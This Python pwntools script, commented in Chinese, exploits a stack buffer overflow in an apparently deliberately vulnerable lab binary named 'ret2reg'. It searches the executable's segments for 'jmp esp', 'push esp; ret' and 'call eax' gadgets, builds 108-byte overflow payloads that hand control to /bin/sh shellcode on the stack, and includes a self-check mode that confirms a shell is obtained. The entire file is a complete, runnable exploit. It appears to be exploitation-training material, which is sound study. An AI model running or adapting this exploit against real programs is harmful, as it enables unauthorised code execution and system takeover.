#!/usr/bin/env python3
"""ret2reg：不泄漏栈地址，直接跳到“指向缓冲区的寄存器”

靶程序编译时加了 -static -z execstack：
  * -static 让可执行文件里带足够多的 gadget（jmp esp / call eax）；
  * -z execstack 让栈可执行，shellcode 可以放在栈上。
程序只打印提示，不打印 buf 地址，因此不能像 ret2shellcode 那样直接
把返回地址写成 buf 的绝对地址，必须借助寄存器完成跳转。

用法：
    python3 exp.py           # 交互式 shell（默认用 jmp esp 变体）
    python3 exp.py --check   # 自动验证两种变体，返回码 0 表示全部成功
"""
import sys

from pwn import ELF, asm, context, p32, process, shellcraft

context(os="linux", arch="i386", log_level="error")

BINARY = "./ret2reg"
CHECK = "--check" in sys.argv
OFFSET = 108  # buf[100] + saved ebx(4) + saved ebp(4)


def search_all(elf: ELF, pattern: bytes):
    """在可执行 PT_LOAD 段里按机器码搜索全部命中，且过滤掉地址中含换行的结果
    （gets 以 \\n 结尾，地址里出现 0x0a 会被截断）"""
    hits = []
    for seg in elf.segments:
        if seg.header.p_type != "PT_LOAD" or not (seg.header.p_flags & 1):
            continue
        data = elf.read(seg.header.p_vaddr, seg.header.p_filesz)
        idx = data.find(pattern)
        while idx != -1:
            addr = seg.header.p_vaddr + idx
            if b"\n" not in p32(addr) and b"\r" not in p32(addr):
                hits.append(addr)
            idx = data.find(pattern, idx + 1)
    return hits


def find_bytes(elf: ELF, pattern: bytes):
    """取第一个可用命中，找不到则报错"""
    hits = search_all(elf, pattern)
    if not hits:
        raise RuntimeError(f"gadget not found: {pattern.hex()}")
    return hits[0]


def start():
    p = process([BINARY])
    p.recvuntil(b"input:")
    return p


def payload_ret_esp(elf: ELF):
    """变体一：ret 到 `jmp esp` / `push esp; ret`，此时 esp 正指向返回地址之后的
    shellcode，不需要知道栈的绝对地址"""
    gadget = find_bytes(elf, b"\xff\xe4") if search_all(elf, b"\xff\xe4") \
        else find_bytes(elf, b"\x54\xc3")
    shellcode = asm(shellcraft.i386.linux.sh())
    return b"A" * OFFSET + p32(gadget) + shellcode, gadget


def payload_call_eax(elf: ELF):
    """变体二：gets 返回后 eax = buf，ret 到 `call eax` 直接执行缓冲区开头"""
    gadget = find_bytes(elf, b"\xff\xd0")  # call eax
    shellcode = asm(shellcraft.i386.linux.sh())
    return shellcode.ljust(OFFSET, b"\x90") + p32(gadget), gadget


def run(payload: bytes):
    p = start()
    p.sendline(payload)
    return p


def main() -> int:
    elf = ELF(BINARY, checksec=False)
    ret_esp, addr1 = payload_ret_esp(elf)
    call_eax, addr2 = payload_call_eax(elf)

    if not CHECK:
        p = run(ret_esp)
        p.interactive()
        return 0

    ok = True
    for name, payload, addr in (
        ("push esp;ret", ret_esp, addr1),
        ("call eax", call_eax, addr2),
    ):
        p = run(payload)
        p.sendline(b"id; exit")
        out = p.recvall(timeout=3)
        hit = b"uid=" in out
        ok = ok and hit
        print(f"[ret2reg:{name}] {'PASS' if hit else 'FAIL'}  gadget={addr:#x}")

    print(f"[ret2reg] {'PASS' if ok else 'FAIL'}  ret_esp={addr1:#x} call_eax={addr2:#x}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())